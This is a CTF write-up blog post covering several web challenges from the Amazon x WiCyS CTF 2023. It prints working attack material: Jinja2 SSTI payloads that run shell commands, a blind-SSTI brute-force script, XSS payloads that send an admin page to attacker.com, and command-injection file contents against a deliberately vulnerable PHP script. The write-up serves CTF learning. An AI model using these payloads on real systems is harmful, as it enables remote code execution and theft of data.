---
title: Amazon x WiCyS CTF 2023
# Summary for listings and search engines
summary: Easy/Medium Web Challenges Writeup 
# Link this post with a project
# projects: []

# Date published
date: "2023-10-03T00:00:00Z"

# Date updated
#lastmod: "2020-12-13T00:00:00Z"

# Is this an unpublished draft?
#draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
 
 
 # placement: 2
  #preview_only: false

authors:
- Wassila Chtioui

tags:
- Web Exploitation
- CTF Write-up

categories:
- Web
- CTF
- XSS
- SSTI
- Blind SSTI
- OS Command Injection

---

# Amazon x WiCyS CTF
## _Web Challenges Write-up_

### Introduction 
It's been quite some time since I posted a CTF writeup so I thought that I will share some of the web challenges solutions of the recent CTF I plyaed: *Amazon X Wicys CTF*.
First, let's talk about Wicys. Woman in Cybersecurity Association focuses on enhancing the role of woman in the field of cybersecurity by launching events, CTFs, workshops.. to encourage more woman join this field. And last week, they collaborated with Amazon to organise a CTF event that I participated in and thought to share with you my writeup as well as my feedback. 

*Please note that this is a writeup for web beginner level players thus I will be explaining every step in detail.* 

### Network Analyzer - 100 points - Easy
The idea behind this challenge was pretty straightforward. Seeing the given website and the description, we can conclude that it's a command injection vulnerability as it was performing a ping command on the provided ip in the user input. 
Command injection - OS command injection vulnerabilities arise when an application incorporates user data into an operating system command that it executes. An attacker can manipulate the data to cause their own commands to run.

A reflex is adding a semicolon ( ; ) after the ip following with our paylaod but this one was filtered.  

![alt text](https://i.imgur.com/yRb0qvh.png)

Luckily, not everything was filtered which made it possible to use the AND operator (&) instead.
_(Check refrences at the bottom for more understanding and more details)_

![alt text](https://i.imgur.com/WAU13zH.png)



### Password Locker on the Web - 100 points - Easy

This one was about a website that encrypts the user input text (20 characters max). Trying a bunch of combination, we can notice that the encryption method is xor cipher. It's also possible to use some tools that helps recognize the encryption method.  Actually, Xoring something with a key and reXoring the result with the first input can give you the actual key..  
The trick here is that we're only allowed to enter 20 characters which is less than the flag length. In this case, all we need to do is to intercept the request with Burpsuite and enter a bunch of random characters. then using [dcode website](https://www.dcode.fr/xor-cipher), we can decode the given result and get the flag ! 

``` Amazon{This_Flag_Is_Secret_front_end_validation_is_bullet_proof} ```

### Happy Birthday Card Generator - 100 points - Easy
This challenge had an SSTI vulnerability although when I first saw the print card feature I thought it's something related to pdf vulnerabilities and I went waaay too far.. 

SSTI - Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. This type of attack can occur when user input is concatenated directly into a template, rather than passed in as data.

We can detect this vulnerability here by seeing the our inpput is being directly reflected in the webpage. We can then start trying various payloads in order to determine what's the template engine being used. (We can also notice in the server response, that it's using Python). The engine here was Jinja2 and the following payload successfully gave us the flag.
``` {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat ../flag.txt').read() }} ```

![alt text](https://i.imgur.com/1tAelEq.png)


### Ecommerce - 200 points - Medium
This one is also an SSTI, Amazon people sure love this vulnerability. Performing just the same steps as the previous challenge, yet this time some filters were applied. When entering two curly brackets "```{{ ```", it detects the malicious input and shows an alert. 

Luckily, reading the [Jinja2 documentation](https://jinja.palletsprojects.com/en/2.10.x/templates/), I found a way to bypass this check. As curly brackets are used to execute various expressions and read data, `{%  ...  %}` is used for  statements. Thus it is possible to make use of this in order to execute our paylaod using an If statement. Trying to come up with the desired structure for doing so, I stumbled upon this [blog post](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) that helped me figure it all out. 

This is a blind injection, so knowing the flag format we can check if our payload is correct by testing on the first character which is A.
```{% if request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read().startswith('A') %} found {% endif %}```

Sending this payload in Burpsuite, we can see that the body response contained the word ```found``` ! Our payload was successfully executed and we can move on to automating the extraction of the flag by writing a short python script. 

```python
import requests

dictionary="azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN{}1234567890-_*%$()?!/;:,.%&|@#~¹[|`§+=<>"
URL = "http://18.220.4.126:6060/addtocart"
final = ""
for i in range(1,60):
        for x in dictionary:
                exploit = "{% if request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read().startswith('"+ final + x+ "') %} found {% endif %}"
                data = {'item': exploit}
                r = requests.post(url = URL , data = data)
                if ("found" in r.text) :
                        final = final + x
                        print ("gj XwaSS!: " + final)
                        break
```
![alt-text](https://i.imgur.com/S5Hehg7.png)



### Bloggerade - 200 points - Medium
This challenge addressed an XSS vulnerability. 
Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users which allows attackers to execute malicious code inside the victim's browser.

Opening the challenge website, we have a report to admin feature, 2 blogs that we can view and a /administrator page which we don't have access to. Analyzing this, we can assume that the flag is in the /administrator page that only the admin can access. Which means we need to find a way to exfiltrate the content of that page. 

Entering one of the blogs we have, we can see that the blog number value is being passed through blogNumber GET parameter and it is reflected back on the page. I immediately tried to change the value to a random number and this number was also reflected.
![alt-text](https://i.imgur.com/OxkHNfG.png)  

Trying an XSS POC, we could successfully get an alert(1) pop up, which means this website is vulnerable to XSS. 
![alt-text](https://i.imgur.com/jEuIRaH.png)

Putting all the puzzle together, we write a simple JS function that upon execution, it sends the content of /administrator page to our server. (The chosen server in this challenge was ngrok, you can use webhook or any other alternative).  
At first, I tried this payload, but it didn't work for some reason, so I used the second one as an alternative. 
##### First failed payload:
```js
var xhr=newXMLHttpRequest();
xhr.open('GET','http://18.225.156.202:9090/administrator',true);
xhr.onload=function(){ varrequest=newXMLHttpRequest();
request.open('GET','https://attacker.com?flag='+ xhr.responseText,true);
request.send() }; xhr.send();
``` 

##### Second successful payload:
```js
fetch('/administrator') 
	.then(response => response.text()) 
	.then(text => { fetch('https://attacker.com?flag=' + encodeURIComponent(text));
	});
```

Sending the payload to the admin, we got the response back from the admin bot with the extracted page content. We can then URL decode it to obtain the flag. 

![alt-text](https://i.imgur.com/n0SDmuM.png)

### Mad Lib - 300 points - Medium
The website for this challenge had an upload feature for txt files only.
There was also a source code, which enabled me to review the code and figure out the vulnerability here. It was a command injection but let's have it explianed little by little.
The challenge folder contained three files: generator.php, index.php and upload.php. 
When trying to upload a txt file, a request was made to upload.php and generator.php file wasn't triggered at all. Seeing its source code for a better understand.

##### generator.php

```php
<?php
function curl_get_contents($url){
	$hostname = parse_url($url)["host"];
	$headers = array( 
		"Host: $hostname",
		"Accept-Language: en-US,en;q=0.9",  
        	"Accept: */*;"
    	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36");
	curl_setopt($ch, CURLOPT_REFERER, $_SERVER[HTTP_HOST]);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_VERBOSE, false);
	$data = curl_exec($ch);
	curl_close($ch);
	print_r("Input: $data");
	return $data;
}

if (isset($_POST["fileLocation"])){
	$file_content = curl_get_contents($_POST['fileLocation']);
	$user_inputs = explode("\n", $file_content);
	if (count($user_inputs) < 5){
		echo "not enough for Mad Lib!";
	}
	else{
		echo "<h2>Here is your story!</h2>";
		system("echo Once upon a time, there lived a $user_inputs[0] named $user_inputs[1] who was $user_inputs[2]. This $user_inputs[0] loved $user_inputs[3] and $user_inputs[4] every day.");
	}
}
else{
	echo "Nothing to Mad Lib QAQ";
}

?>

```
Analysing this file, we can see that it accepts a POST request that contains a parameter called _fileLocation_ that is being passed to _curl_get_contents_ function as an argument. This function basically uses cURL to fetch the contents of the provided url. 
So now we know that the txt file must be hosted on a server that we will be then passing to the _fileLocation_ parameter. 

Next, the fetched file content must contain less than 5 lines to execute the else block. Here's the interesting part! 

> system("echo Once upon a time, there lived a $user_inputs[0] named $user_inputs[1] who was $user_inputs[2]. This $user_inputs[0] loved $user_inputs[3] and $user_inputs[4] every day.");

So system functions execute OS commands and having control over it means we can get a command injection. In this case, each one of the lines in our uploaded txt file are being directly concatenated in the system function. Note that to execute commands inside _echo_, the payload must begin with a dollar sign ($). Now let's have our txt file ready and send the appropriate request!

##### exploit.txt
```txt
$ls
$ls
$(ls /)
$(ls)
$(cat /sup3r-0bscuR3-n@m3-0f_TH3_fl4g.txt)
```

Sending this over to _generator.php_ using Burpsuite, we can get the flag!! 
 
![alt-text](https://i.imgur.com/qr0BYXN.png)


### Conclusion
I would like to thank both Wicys and Amazon for organizing such an amazing event. Also special thanks to the authors who were very kind and responsive! The challenges were a good practice to test my capabilities in CTFs and apply what I've learnt so far.


References:
[How to Run Multiple Commands at once in Linux | 2DayGeek](https://www.2daygeek.com/run-multiple-commands-linux/#:~:text=How%20to%20Run%20Multiple%20Commands%20at%20once%20in,commands%20simultaneously%20with%20the%20Logical%20OR%20operator%20%28%7C%7C%29) 
[What is OS command injection, and how to prevent it? | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/os-command-injection)
[What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/cross-site-scripting)
[Server-side template injection | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/server-side-template-injection)
